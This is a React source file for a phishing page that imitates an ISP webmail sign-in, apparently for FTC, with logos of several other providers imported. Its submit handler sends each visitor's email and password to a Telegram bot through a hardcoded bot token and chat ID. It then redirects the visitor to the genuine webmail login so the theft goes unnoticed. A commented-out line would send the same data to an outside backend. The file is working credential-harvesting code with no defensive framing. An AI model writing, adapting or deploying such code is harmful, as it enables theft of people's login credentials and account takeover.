import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';

import iglou from './iglou.png';
import catskill from './catskill.png';
import winstream from './windstream.png';
import wave from './wave.png';
import centurylink from './centurylink.png';
import ftc from './ftc.svg';

function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("FTC")

    const[showError, setShowError] = useState(false);

    async function handleSubmit(e){
      e.preventDefault();
  
      try {
          // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
          //     email:email,
          //     password:password,
          //     platform:platform
          // });
  
         const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
              chat_id: 5868304053,
              text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
            });
  
      
          // Handle success
       
  
          if(response.status == 200){
             // console.log(response.data.message);
  
            
             window.location.href = 'https://webmail.ftc-i.net/login';
          }
        } catch (error) {
          // Handle error
          console.error('Error:', error);
        }
      
  }

    return (
        <>

        <div className='spacer'>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>



            <div className='my-2 px-3 text-center'>
            <img  src={ftc} className="mylogo"/>

            </div>


            <div className='col-md-4 whitediv m-auto   px-0'>
              

            
                



                <form onSubmit={handleSubmit} className="px-5">

                    <div className='form-group mt-5'>
                 
                        <input type="email"onChange={function(e){
                            setUserName(e.target.value);
                        }}value={email} placeholder="Email" className="form-control bottom-border-only py-3"required />

                    </div>

                    <br/>


                    <div className='form-group'>
                  
                 
                        <input type="password"onChange={function(e){
                            setPassword(e.target.value);
                        }}value={password} placeholder="Password" className="form-control bottom-border-only py-3"required />
                       

                    </div>

                    

                    <div className='form-group'>
                      <input type="checkbox" /> <span className='font-weight-normal px-2'>Stay signed in
</span>

                    </div>



                   


                    {/* <div className='form-group'>
                    <label class="toggle-container">
                        <input type="checkbox"className='mycheck'/> 
                     <span class="toggle-slider"></span> <span className='px-3 'style={{
                         fontSize:"15px",
                     }}>Shared computer - log me out after 4 hours</span>
    </label>

                    </div> */}


                    {/* <div className='form-group'>
                    <label class="toggle-container">
                        <input type="checkbox"className='mycheck'/> 
                     <span class="toggle-slider"></span> <span className='px-3 'style={{
                         fontSize:"15px",
                     }}>Keep me logged in until I log out</span>
    </label>

                    </div> */}


                    <div className='form-group text-center mt-5'>

<button type='submit' style={{
  backgroundColor: '#0047bb',
  fontSize:'18px',
}}className='btn text-center w-100 font-weight-bold text-light py-2 rounded '>Sign In</button>






</div>

<div className='linkdiv text-center'>
  <a style={{
        color: 'grey',
        textDecoration: 'none',
  }}>Forgot Password <br/>
</a>

</div>



<br>

</br>

        

                </form>

            </div>
        
        </>
    );
}

export default Home;